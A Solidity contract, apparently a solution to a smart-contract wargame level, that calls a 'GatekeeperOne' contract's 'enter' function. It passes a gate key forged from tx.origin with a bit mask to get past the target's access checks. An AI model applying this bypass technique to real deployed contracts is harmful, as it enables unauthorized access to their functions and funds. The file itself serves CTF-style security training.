// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

    function attack(address _gatekeeperAddr) public {
        address _origin = tx.origin;
        bytes8 key = bytes8(uint64(uint160(_origin))) & 0xFFFFFFFF0000FFFF;
        bool r = GatekeeperOne(_gatekeeperAddr).enter(key);
        assert(r);
    }

}